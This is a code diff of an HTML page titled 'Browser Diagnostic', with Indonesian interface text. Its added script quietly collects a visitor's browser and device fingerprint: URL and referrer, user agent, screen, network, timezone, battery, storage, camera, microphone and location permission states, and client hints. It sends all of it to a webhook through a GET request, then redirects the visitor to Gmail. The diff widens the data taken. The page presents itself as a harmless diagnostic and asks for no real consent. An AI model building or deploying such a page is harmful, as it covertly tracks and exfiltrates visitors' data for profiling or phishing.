@@ -6,48 +6,47 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0">
 
-<title>Browser Diagnostic Redirect</title>
+<title>Browser Diagnostic</title>
 
 <style>
 
 body{
-margin:0;
-height:100vh;
-display:flex;
-align-items:center;
-justify-content:center;
-background:#202124;
-font-family:Arial;
+    margin:0;
+    min-height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    background:#202124;
+    font-family:Arial,sans-serif;
 }
 
 .card{
-background:white;
-width:90%;
-max-width:420px;
-padding:35px;
-border-radius:18px;
-text-align:center;
-box-shadow:0 10px 30px #0005;
+    background:white;
+    width:90%;
+    max-width:420px;
+    padding:35px;
+    border-radius:18px;
+    text-align:center;
+    box-shadow:0 10px 30px #0005;
 }
 
 button{
-width:100%;
-padding:15px;
-border:0;
-border-radius:10px;
-background:#1a73e8;
-color:white;
-font-size:17px;
-cursor:pointer;
+    width:100%;
+    padding:15px;
+    border:0;
+    border-radius:10px;
+    background:#1a73e8;
+    color:white;
+    font-size:17px;
+    cursor:pointer;
 }
 
 button:disabled{
-background:#888;
+    background:#777;
 }
 
 #status{
-margin-top:20px;
-font-size:14px;
+    margin-top:20px;
 }
 
 </style>
@@ -62,20 +61,15 @@ font-size:14px;
 
 <h2>Continue</h2>
 
-<p>
-Browser Diagnostic
-</p>
-
+<p>Browser Diagnostic</p>
 
 <button id="send">
-Kirim & Lanjut
+Kirim Data
 </button>
-
 
 <div id="status">
 Ready
 </div>
-
 
 </div>
 
@@ -89,15 +83,14 @@ const WEBHOOK =
 
 
 
-async function batteryInfo(){
+async function getBattery(){
 
 try{
 
 if(navigator.getBattery){
 
-const b =
+let b =
 await navigator.getBattery();
-
 
 return {
 
@@ -105,7 +98,13 @@ level:
 Math.round(b.level*100)+"%",
 
 charging:
-b.charging
+b.charging,
+
+chargingTime:
+b.chargingTime,
+
+dischargingTime:
+b.dischargingTime
 
 };
 
@@ -113,6 +112,23 @@ b.charging
 
 }catch(e){}
 
+return null;
+
+}
+
+
+
+async function getStorage(){
+
+try{
+
+if(navigator.storage){
+
+return await navigator.storage.estimate();
+
+}
+
+}catch(e){}
 
 return null;
 
@@ -120,7 +136,51 @@ return null;
 
 
 
-function collect(){
+async function getPermissions(){
+
+let list=[
+"geolocation",
+"camera",
+"microphone",
+"notifications"
+];
+
+
+let result={};
+
+
+if(!navigator.permissions)
+return result;
+
+
+
+for(let p of list){
+
+try{
+
+let r=
+await navigator.permissions.query({
+name:p
+});
+
+result[p]=r.state;
+
+}catch(e){
+
+result[p]="unsupported";
+
+}
+
+}
+
+
+return result;
+
+}
+
+
+
+async function collect(){
 
 
 const n=navigator;
@@ -132,12 +192,11 @@ n.mozConnection;
 
 
 
-return {
+let data={
 
 
 event:
-"browser_full_metadata",
-
+"browser_diagnostic_full",
 
 
 timestamp:
@@ -145,7 +204,7 @@ new Date().toISOString(),
 
 
 
-location_page:{
+page:{
 
 url:
 location.href,
@@ -156,8 +215,8 @@ document.title,
 referrer:
 document.referrer,
 
-origin:
-location.origin
+visibility:
+document.visibilityState
 
 },
 
@@ -180,6 +239,9 @@ n.platform,
 vendor:
 n.vendor,
 
+appVersion:
+n.appVersion,
+
 online:
 n.onLine,
 
@@ -187,12 +249,14 @@ cookieEnabled:
 n.cookieEnabled,
 
 doNotTrack:
-n.doNotTrack || null,
-
-javaEnabled:
-n.javaEnabled ? n.javaEnabled():false
+n.doNotTrack || null
 
 },
+
+
+
+clientHints:{},
+
 
 
 
@@ -204,10 +268,10 @@ screen.width,
 height:
 screen.height,
 
-availableWidth:
+availWidth:
 screen.availWidth,
 
-availableHeight:
+availHeight:
 screen.availHeight,
 
 colorDepth:
@@ -217,7 +281,7 @@ pixelDepth:
 screen.pixelDepth,
 
 pixelRatio:
-devicePixelRatio
+window.devicePixelRatio
 
 },
 
@@ -237,11 +301,11 @@ outerWidth,
 outerHeight:
 outerHeight,
 
-scrollWidth:
-document.documentElement.scrollWidth,
+scrollX:
+scrollX,
 
-scrollHeight:
-document.documentElement.scrollHeight
+scrollY:
+scrollY
 
 },
 
@@ -266,7 +330,7 @@ n.maxTouchPoints || 0
 
 
 network:
-c?{
+c ? {
 
 type:
 c.effectiveType,
@@ -284,40 +348,95 @@ c.saveData
 
 
 
+timezone:{
+
+zone:
+Intl.DateTimeFormat()
+.resolvedOptions()
+.timeZone,
+
+locale:
+Intl.DateTimeFormat()
+.resolvedOptions()
+.locale,
+
+offset:
+new Date().getTimezoneOffset(),
+
+local:
+new Date().toString()
+
+},
+
+
+
 display:{
 
 darkMode:
 matchMedia("(prefers-color-scheme:dark)").matches,
 
 reducedMotion:
-matchMedia("(prefers-reduced-motion:reduce)").matches
+matchMedia("(prefers-reduced-motion:reduce)").matches,
+
+colorGamut:
+matchMedia("(color-gamut:p3)").matches
 
 },
 
 
 
-time:{
+hardwareAPI:{
 
-timezone:
-Intl.DateTimeFormat().resolvedOptions().timeZone,
+bluetooth:
+!!navigator.bluetooth,
 
-offset:
-new Date().getTimezoneOffset(),
+usb:
+!!navigator.usb,
 
-locale:
-Intl.DateTimeFormat().resolvedOptions().locale,
+mediaDevices:
+!!navigator.mediaDevices
 
-local:
-new Date().toString()
+},
 
-}
 
+
+storage:
+await getStorage(),
+
+
+battery:
+await getBattery(),
+
+
+permissions:
+await getPermissions()
 
 
 };
 
 
+
+try{
+
+
+if(n.userAgentData){
+
+data.clientHints =
+await n.userAgentData.toJSON();
+
 }
+
+
+}catch(e){}
+
+
+
+return data;
+
+
+}
+
+
 
 
 
@@ -329,48 +448,47 @@ document
 this.disabled=true;
 
 
-const status=
+let status=
 document.getElementById("status");
 
 
 status.innerHTML=
-"Mengirim...";
+"Mengumpulkan...";
 
 
 
 let data =
-collect();
+await collect();
 
 
 
-data.battery =
-await batteryInfo();
-
-
-
-const params =
+let params =
 new URLSearchParams();
 
 
-Object.keys(data)
-.forEach(k=>{
+
+for(let key in data){
 
 params.append(
-k,
-typeof data[k]=="object"
+
+key,
+
+typeof data[key]=="object"
 ?
-JSON.stringify(data[k])
+JSON.stringify(data[key])
 :
-data[k]
+data[key]
+
 );
 
-});
+}
 
 
 
 fetch(
 WEBHOOK+"?"+params.toString()
 )
+
 .then(()=>{
 
 
@@ -380,15 +498,14 @@ status.innerHTML=
 
 setTimeout(()=>{
 
-
 location.href=
 "https://mail.google.com";
-
 
 },1000);
 
 
 })
+
 .catch(()=>{
 
 
